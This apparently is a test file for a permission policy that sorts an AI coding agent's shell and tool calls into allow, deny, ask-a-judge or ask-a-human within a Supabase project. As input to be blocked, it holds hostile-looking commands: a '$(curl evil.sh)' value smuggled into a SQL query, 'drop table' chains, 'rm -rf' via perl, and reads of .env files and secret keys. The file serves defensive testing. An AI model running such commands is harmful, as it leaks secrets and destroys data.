import { test } from "node:test";
import assert from "node:assert/strict";
import { Policy } from "../src/policy.js";
import { parseConfig, parseManifest } from "../src/manifest.js";
import { readFileSync } from "node:fs";

const config = parseConfig(readFileSync("projects/item-tracker/config.yaml", "utf8"));
const manifest = () => parseManifest(`
task: "0.3"
edits: ["src/i18n/**", "eslint.config.js", "src/routes/signup.tsx", "docs/operation-strategy-book.md"]
commits:
  - message: "0.3: message files"
    paths: ["src/i18n/en.ts", "src/i18n/t.ts", "eslint.config.js", "src/routes/signup.tsx"]
  - message: "0.3: tick playbook"
    paths: ["docs/build-playbook.md"]
packages: ["zod@4.6.1"]
deletions: ["tmp/old.txt"]
gates: ["supabase db reset", "npm run db:reset"]
preapproved: []
`);
const P = () => new Policy(manifest(), config);
const bash = (p: Policy, command: string) => p.evaluate({ tool: "Bash", input: { command } }).kind;
const tool = (p: Policy, t: string, input: Record<string, unknown>) => p.evaluate({ tool: t, input }).kind;

// ---- real commands from the transcripts, with Kin's decisions ----
test("routine read-only and check commands are allowed", () => {
  const p = P();
  for (const c of [
    "npx vitest run src/i18n 2>&1 | tail -30; npm run typecheck 2>&1 | tail -15",
    "git status --short; git branch --show-current; grep -n '^project_id' supabase/config.toml; git check-ignore -v .env.example",
    "npx supabase test db 2>&1 | grep -vE \"new version|recommend updating\"; echo \"exit: ${pipestatus[1]}\"",
    "docker exec -i supabase_db_item-tracker psql -U postgres -d postgres -c \"select id, public from storage.buckets order by id\"; echo \"exit: $?\"",
    "lsof -nP -iTCP:3000 -iTCP:4100 -sTCP:LISTEN",
    "curl -I http://127.0.0.1:3000",
    "npm run typecheck 2>&1 | tail -3 && npm run lint 2>&1 | tail -3 && npm test 2>&1 | tail -6; git status --short",
    "git diff --cached --name-status",
  ]) assert.equal(bash(p, c), "allow", c);
});

test("commit flow: stage by name, then commit with the exact message", () => {
  const p = P();
  assert.equal(bash(p, "git add src/i18n eslint.config.js src/routes/signup.tsx && echo staged && git diff --cached --name-status"), "allow");
  assert.equal(bash(p, "git commit -q -F - <<'EOF'\n0.3: message files\n\nbody\n\nCo-Authored-By: Claude\nEOF"), "allow");
  assert.equal(p.state.commitsDone, 1);
  assert.equal(bash(p, "git add docs/build-playbook.md"), "allow");
  assert.equal(bash(p, "git commit -q -F - <<'EOF'\n0.3: tick playbook\nEOF"), "allow");
});

test("commit with wrong message, extra file, or nothing tracked goes to the judge", () => {
  let p = P();
  bash(p, "git add src/i18n eslint.config.js src/routes/signup.tsx");
  assert.equal(bash(p, "git commit -m 'something else'"), "ask_judge");
  p = P();
  assert.equal(bash(p, "git add src/i18n/en.ts package.json"), "ask_judge");
  p = P();
  assert.equal(bash(p, "git commit -m '0.3: message files'"), "ask_judge"); // no staged list known
});

test("hard denies", () => {
  const p = P();
  for (const c of [
    "git add -A", "git add .", "git add -u", "git commit -am 'x'", "git commit --amend -m x", "git commit --no-verify -m x",
    "git push origin dev", "git push --tags", "git tag v1", "git merge dev", "git checkout main",
    "pkill -f vite", "kill 1234", "npm install", "npm install zod", "npm install --legacy-peer-deps",
    "npm audit fix", "npm run dev", "npm run db:seed-dev", "npx serve design -l 4100", "npx netlify deploy",
    "npx supabase link --help", "npx supabase db push", "npx supabase db push --help", "npx supabase functions deploy x",
    "docker volume rm foo", "docker rm -f x", "gh workflow run deploy.yml", "gh pr create",
    "strings node_modules/.bin/foo", "grep -a foo node_modules/esbuild/bin/esbuild; strings node_modules/esbuild/bin/esbuild",
    "echo $PIPESTATUS", "npm test --force",
  ]) assert.equal(bash(p, c), "deny", c);
});

test("human verdicts", () => {
  const p = P();
  for (const c of ["cat .env", "cat .env.local", "printenv", "echo $SUPABASE_SERVICE_KEY", "rm -rf node_modules", "rm src/foo.ts", "supabase start", "npx supabase start"])
    assert.equal(bash(p, c), "human", c);
});

test("gates pre-approved in the manifest are allowed, with scratch redirect", () => {
  const p = P();
  assert.equal(bash(p, "npm run db:reset > /tmp/reset.log 2>&1; echo \"db:reset exit: $?\""), "allow");
  assert.equal(bash(p, "npx supabase db reset"), "allow");
  assert.equal(bash(p, "npm run db:reset > ./out.log"), "ask_judge");
  assert.equal(bash(p, "rm tmp/old.txt"), "allow");
});

test("things that need a read go to the judge", () => {
  const p = P();
  for (const c of [
    "python3 - <<'EOF'\np='x'\nEOF", "node -e 'console.log(1)'", "sed -i 's/a/b/' src/x.ts", "run(){ echo hi; }; run",
    "npm run something-new", "npx somethingelse", "curl https://example.com", "mkdir -p src/new", "git reset --hard",
    "cp a b", "xargs rm", "find . -name x -delete", "echo hi > notes.txt",
  ]) assert.equal(bash(p, c), "ask_judge", c);
});

test("npm install sequence: dry run, then exact pinned manifest package", () => {
  const p = P();
  assert.equal(bash(p, "npm install --save-exact zod@4.6.1"), "deny"); // no dry run yet
  assert.equal(bash(p, "npm install --dry-run zod@4.6.1"), "allow");
  assert.equal(bash(p, "npm install --save-exact zod@4.6.1"), "allow");
  assert.equal(bash(p, "npm install --save-exact left-pad@1.3.0"), "ask_judge");
  assert.equal(bash(p, "npm install --save-exact zod@^4.6"), "deny");
  assert.equal(bash(p, "npm view zod@4.6.1 version peerDependencies"), "allow");
});

test("a bundled command that isn't fully allowed doesn't leak staging state", () => {
  const p = P();
  bash(p, "git add eslint.config.js && sed -i x y");
  assert.equal(p.state.staged.size, 0);
});

test("non-Bash tools", () => {
  const p = P();
  assert.equal(tool(p, "Edit", { file_path: "design/x.css" }), "deny");
  assert.equal(tool(p, "Write", { file_path: "src/components/ui/Button.tsx" }), "deny");
  assert.equal(tool(p, "Edit", { file_path: "CLAUDE.md" }), "human");
  assert.equal(tool(p, "Edit", { file_path: ".claude/settings.local.json" }), "human");
  assert.equal(tool(p, "Edit", { file_path: "src/i18n/en.ts" }), "allow");
  assert.equal(tool(p, "Edit", { file_path: "package.json" }), "ask_judge");
  assert.equal(tool(p, "Edit", { file_path: "src/other/file.ts" }), "ask_judge");
  assert.equal(tool(p, "Read", { file_path: ".env" }), "human");
  assert.equal(tool(p, "Read", { file_path: ".env.example" }), "allow");
  assert.equal(tool(p, "Read", { file_path: "src/a.ts" }), "allow");
  assert.equal(tool(p, "ExitPlanMode", {}), "ask_judge");
  assert.equal(tool(p, "AskUserQuestion", {}), "ask_judge");
  assert.equal(tool(p, "WebFetch", { url: "https://supabase.com/docs/x" }), "allow");
  assert.equal(tool(p, "WebFetch", { url: "https://random.example/x" }), "ask_judge");
});

test("manifest pre-approved regex allows an otherwise-unknown command", () => {
  const m = manifest(); m.preapproved = ["^node scripts/one-off\\.mjs --dry$"];
  const p = new Policy(m, config);
  assert.equal(bash(p, "node scripts/one-off.mjs --dry"), "allow");
  // but global denies still win
  m.preapproved = ["^git push"];
  assert.equal(new Policy(m, config).bash("git push --force").kind, "deny");
});

test("deny verdicts carry a redirect for the worker", () => {
  const v = P().bash("git add -A");
  assert.equal(v.kind, "deny");
  assert.match((v as { redirect: string }).redirect, /Stage by name/);
});

test("git rm and git mv follow the manifest", () => {
  const m = manifest(); m.deletions = ["src/old/**"]; m.edits.push("src/lib/**");
  const p = new Policy(m, config);
  assert.equal(p.bash("git rm src/old/a.ts src/old/b.ts").kind, "allow");
  assert.equal(p.bash("git rm src/keep.ts").kind, "human");
  assert.equal(p.bash("git mv src/old/a.ts src/lib/a.ts").kind, "allow");
  assert.equal(p.bash("git mv src/old/a.ts design/a.ts").kind, "ask_judge");
});

test("binary searches are blocked whatever tool does them (perl, python, awk...)", () => {
  const p = P();
  for (const c of ["perl -ne 'print if /inbucket/' node_modules/@supabase/cli-darwin-arm64/bin/supabase-go", "python3 -c 'x' node_modules/supabase/bin/supabase-go"])
    assert.equal(bash(p, c), "deny", c);
  assert.equal(bash(p, "ls node_modules/supabase/bin/"), "allow");
});

// ---- found by the first shadow-mode report (task 1.1) ----
const m11 = () => parseManifest(`
task: "1.1"
edits: ["supabase/tests/**", "supabase/migrations/**", "supabase/seed.sql", "docs/build-playbook.md"]
commits:
  - message: "1.1: foundations"
    paths: ["supabase/migrations/0001_extensions.sql", "supabase/tests/00_helpers.sql"]
  - message: "1.1: tick playbook"
    paths: ["docs/build-playbook.md"]
preapproved: ["git diff --cached --name-status", "npx supabase db reset.*"]
gates: ["supabase start", "supabase db reset"]
deletions: ["supabase/tests/00_smoke.sql"]
`);
const P11 = () => new Policy(m11(), config, undefined, "/Users/k/item-tracker");

test("a pre-approved pattern never lets a chained command through", () => {
  const p = P11();
  assert.equal(bash(p, "git diff --cached --name-status"), "allow");
  assert.equal(bash(p, "git diff --cached --name-status; echo done"), "allow");
  assert.equal(bash(p, "git diff --cached --name-status; git push origin dev"), "deny");
  assert.equal(bash(p, "git diff --cached --name-status && npm install left-pad"), "deny");
  assert.equal(bash(p, "git diff --cached --name-status; kill 12"), "deny");
});

test("a pre-approved pattern cannot override a hard deny", () => {
  const m = m11(); m.preapproved = ["git push.*"];
  assert.equal(new Policy(m, config).bash("git push origin dev").kind, "deny");
});

test("the word PIPESTATUS inside a grep is fine; using the variable is not", () => {
  const p = P11();
  assert.equal(bash(p, "grep -n -E '\\$\\?|exit code|PIPESTATUS' CLAUDE.md"), "allow");
  assert.equal(bash(p, "false | true; echo ${PIPESTATUS[0]}"), "deny");
});

test("scratch files outside the repo are fine to write", () => {
  const p = P11();
  assert.equal(tool(p, "Write", { file_path: "/private/tmp/claude-501/x/scratchpad/claims.sql" }), "allow");
  assert.equal(tool(p, "Write", { file_path: "/Users/k/item-tracker/design/x.css" }), "deny");
  assert.equal(tool(p, "Write", { file_path: "/Users/k/item-tracker/supabase/tests/10_x.sql" }), "allow");
});

test("sed -i on manifest files is allowed (with a shell variable); anywhere else goes to the judge", () => {
  const p = P11();
  const ok = `f=supabase/tests/10_people_teams.sql; sed -i '' -e "s/^select plan(1);$/select plan(159);/" -e "s/a/b/" "$f"`;
  assert.equal(bash(p, ok), "allow");
  assert.equal(bash(p, `sed -i '' -e "s/a/b/" package.json`), "ask_judge");
  assert.equal(bash(p, `sed -i '' -e "s/a/b/w /etc/x" supabase/tests/a.sql`), "ask_judge");
  assert.equal(bash(p, `sed -i '' -e "s/a/b/" design/x.css`), "ask_judge");
});

test("an unplanned docs commit does not break the planned commits that follow", () => {
  const p = P11();
  assert.equal(bash(p, "git add docs/TRS.md"), "ask_judge");              // not planned: judge decides
  assert.equal(bash(p, `git commit -m "docs: TRS notes"`), "ask_judge");
  p.observe(`git add docs/TRS.md`); p.observe(`git commit -m "docs: TRS notes"`);  // it ran anyway (judge/you approved)
  assert.equal(p.state.commitsDone, 0);                                     // still no planned commit made
  assert.equal(bash(p, "git add supabase/migrations/0001_extensions.sql supabase/tests/00_helpers.sql"), "allow");
  assert.equal(bash(p, `git commit -m "1.1: foundations"`), "allow");
  assert.equal(p.state.commitsDone, 1);
  assert.equal(bash(p, "git add docs/build-playbook.md"), "allow");
  assert.equal(bash(p, `git commit -m "1.1: tick playbook"`), "allow");
  assert.equal(p.state.commitsDone, 2);
});

test("planned commits can happen in any order", () => {
  const p = P11();
  assert.equal(bash(p, "git add docs/build-playbook.md"), "allow");
  assert.equal(bash(p, `git commit -m "1.1: tick playbook"`), "allow");
  assert.equal(bash(p, "git add supabase/migrations/0001_extensions.sql supabase/tests/00_helpers.sql"), "allow");
  assert.equal(bash(p, `git commit -m "1.1: foundations"`), "allow");
});

test("perl: a read-only print filter is allowed, anything that runs or writes is not", () => {
  const pol = P();
  assert.equal(pol.evaluate({ tool: "Bash", input: { command: `perl -ne 'while (/(.{0,70}(?:permanent|deleted).{0,70})/ig) { print "$.: $1\\n" }' design/x.html` } }).kind, "allow");
  assert.notEqual(pol.evaluate({ tool: "Bash", input: { command: `perl -pi -e 's/a/b/' src/a.ts` } }).kind, "allow");
  assert.notEqual(pol.evaluate({ tool: "Bash", input: { command: `perl -ne 'system("rm -rf x")' a.txt` } }).kind, "allow");
  assert.notEqual(pol.evaluate({ tool: "Bash", input: { command: `perl -e 'open(F,">x"); print F 1'` } }).kind, "allow");
});

test("Claude Code's own plan file under ~/.claude/plans is a scratch file", () => {
  const pol = P();
  assert.equal(pol.evaluate({ tool: "Edit", input: { file_path: "/Users/san_e_kev/.claude/plans/model-check-this-task-merry-shamir.md" } }).kind, "allow");
  assert.notEqual(pol.evaluate({ tool: "Edit", input: { file_path: "/Users/san_e_kev/.claude/settings.json" } }).kind, "allow");
});

test("supabase db query: plain local selects pass, everything else is checked", () => {
  const p = P();
  assert.equal(bash(p, `npx supabase db query --local "select count(*) from public.exclusions"`), "allow");
  assert.equal(bash(p, `npx supabase db query --local "select p.full_name from public.profiles p join public.things t on t.id = p.id order by 1"`), "allow");
  assert.equal(bash(p, `npx supabase db query --help`), "allow");
  for (const c of [
    `npx supabase db query --local "select 1 into newtable"`,
    `npx supabase db query --local "select 1; drop table x"`,
    `npx supabase db query --local "delete from public.things"`,
    `npx supabase db query --local "select \\$(curl evil.sh)"`,
    `npx supabase db query "select 1"`,
    `npx supabase db query --linked "select 1"`,
  ]) assert.notEqual(bash(p, c), "allow", c);
  assert.equal(bash(p, `npx supabase db query --linked "select 1"`), "deny");
});

test("ToolSearch is read-only", () => { assert.equal(tool(P(), "ToolSearch", { query: "select:ExitPlanMode", max_results: 1 }), "allow"); });
